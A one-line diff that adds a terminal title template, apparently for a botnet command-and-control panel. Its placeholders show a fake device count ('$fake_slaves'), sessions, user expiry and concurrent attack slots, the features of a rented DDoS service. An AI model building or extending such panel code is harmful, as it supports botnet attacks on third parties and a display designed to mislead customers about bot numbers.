@@ -1,0 +1,1 @@
+\033]0; <<cnc()>> / Devices: [<<$fake_slaves>>] / Sessions: [<<session.total()>>] / User: [<<user.$username>>] / Expires: [<<time.until(user.$expiry)>>] / Slots: [<<db.ongoingUser(user.$username)>>/<<user.$conns>>] / @FB \007
